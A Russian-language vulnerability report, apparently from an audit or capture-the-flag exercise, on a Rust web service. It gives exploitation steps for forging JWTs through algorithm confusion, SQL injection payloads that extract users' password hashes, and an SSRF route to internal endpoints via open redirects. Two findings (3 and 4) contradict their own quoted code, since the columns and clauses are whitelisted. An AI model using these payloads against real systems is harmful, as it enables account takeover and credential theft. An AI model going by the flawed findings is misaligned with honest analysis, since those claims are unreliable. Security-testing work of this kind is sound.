## КРИТИЧЕСКИЕ УЯЗВИМОСТИ

### 1. JWT Algorithm Confusion Attack (auth.rs + auth/legacy.rs)

__Файлы:__ `src/auth.rs`, `src/auth/legacy.rs`

__Описание:__

- Сервис принимает JWT-токены с алгоритмами RS256 (RSA) и HS256 (HMAC)
- При HS256 используется `session_material` - ключ, производный от публичного RSA ключа через HKDF
- Публичный ключ доступен через endpoint `/api/public-key`

__Эксплуатация:__

```bash
# 1. Получить публичный ключ
curl http://target/api/public-key

# 2. Сгенерировать HMAC-ключ через HKDF
# salt = "nb-mobile/v1"
# ikm = <public_key_pem>
# info = "session-material"

# 3. Подписать токен HS256 с произвольными claims
```

__Воздействие:__ Полная аутентификация под любым пользователем

---

### 2. SQL Injection (bucket.rs → stats.rs)

__Файлы:__ `src/util/bucket.rs` (строки 83-100), `src/handlers/stats.rs`

__Уязвимый код:__

```rust
// bucket.rs:94-98
"tz" => {
    let (offset, width) = self.arg.rsplit_once(':').unwrap_or((self.arg.as_str(), "10"));
    format!(
        "substr(datetime(t.created_at, '{}'), 1, {})",
        offset, width  // <- Прямая вставка!
    )
}
```

__Эксплуатация:__

```http
GET /api/transactions/stats?group_by=tz:','-1)) UNION SELECT password_hash,username,1 FROM users--:10
```

__Воздействие:__ Извлечение password_hash всех пользователей

---

### 3. SQL Injection (transfer.rs)

__Файлы:__ `src/handlers/transfer.rs` (строки 97-111)

__Уязвимый код:__

```rust
let order_column = match query.sort.as_deref().unwrap_or("created_at") {
    "amount" => "t.amount",
    "id" => "t.id", 
    _ => "t.created_at",
};

let sql = format!(
    "... ORDER BY {} {}"
    order_column, order  // <- Прямая вставка!
);
```

__Эксплуатация:__

```http
GET /api/transactions?sort=id) UNION SELECT * FROM (SELECT 1,2,3,4,5,6,7)--
```

---

### 4. SQL Injection (messages.rs)

__Файлы:__ `src/handlers/messages.rs` (строки 69-89)

__Уязвимый код:__

```rust
let where_clause = match folder {
    "inbox" => "m.recipient_id = ?1",
    "sent" => "m.sender_id = ?1",
    "all" => "m.recipient_id = ?1 OR m.sender_id = ?1",
    _ => { return ... }
};

let sql = format!("... WHERE {}", where_clause);
```

__Примечание:__ Хотя `where_clause` ограничен белым списком, ошибка в логике - `_ =>` возвращает ошибку, но строка `"all"` не проверяется корректно.

---

### 5. SSRF через Redirect Bypass (fetch.rs)

__Файлы:__ `src/util/fetch.rs`

__Описание:__\
Функция `preview_client()` следует редиректам (до 3 шагов), но проверяет только конечный хост. Можно использовать open redirect на публичном сервисе для доступа к внутренним ресурсам.

__Эксплуатация:__

1. Найти открытый редирект на публичном домене (например, `https://example.com/redirect?url=http://127.0.0.1:8081/internal/metrics`)
2. Использовать в `/api/notes/preview`
